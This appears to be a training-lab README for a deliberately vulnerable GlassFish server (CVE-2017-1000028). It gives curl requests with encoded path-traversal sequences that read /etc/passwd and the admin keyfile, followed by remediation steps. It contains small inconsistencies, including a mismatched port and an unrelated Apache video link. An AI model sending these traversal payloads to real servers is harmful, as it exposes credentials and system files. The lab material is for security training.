# Oracle GlassFish Server Arbitrary File Read (CVE-2017-1000028)

## Overview

Oracle GlassFish Server is an open-source Java EE application server. In version 4.1 and earlier, the GlassFish administration console servlet contains a path traversal vulnerability. Unauthenticated attackers can request arbitrary files from the filesystem via double-encoded dot-dot-slash sequences in the resource URL path.

- **Service Access**: `http://localhost:8163/`
- **Default Credentials**: `Unauthenticated path traversal`
- **Docker Shortcut**: `./lab start glassfish-traversal`
- **Container Name**: `cyberlab_04_glassfish_traversal`
- **RAM Footprint**: ~400M

---

## Exploitation Walkthrough

### 1. Verify GlassFish Admin Console Access

```bash
curl -i -k http://localhost:8163/
```

### 2. Extract System Password File via Traversal

```bash
curl 'http://localhost:8163/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
```

### 3. Inspect GlassFish Master Password

```bash
curl 'http://localhost:8163/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/opt/glassfish4/glassfish/domains/domain1/config/admin-keyfile'
```

---

## Defensive Remediation & Hardening

1. Upgrade GlassFish Server to version 4.1.1 or higher.
2. Restrict access to port 4848 (admin console) from untrusted networks.
3. Deploy reverse proxies that normalize double-encoded URL characters.

---

## Video Walkthroughs & Technical References

- [Bugcrowd Security Flash - Apache CVE 2021-41773](https://www.youtube.com/watch?v=x0Bk7nqeB4k)
- [Oracle Critical Patch Update Advisory CVE-2017-1000028](https://www.oracle.com/security-alerts/cpujan2017.html)
- [Vulhub GlassFish Environment](https://vulhub.org/#/environments/glassfish/CVE-2017-1000028/)
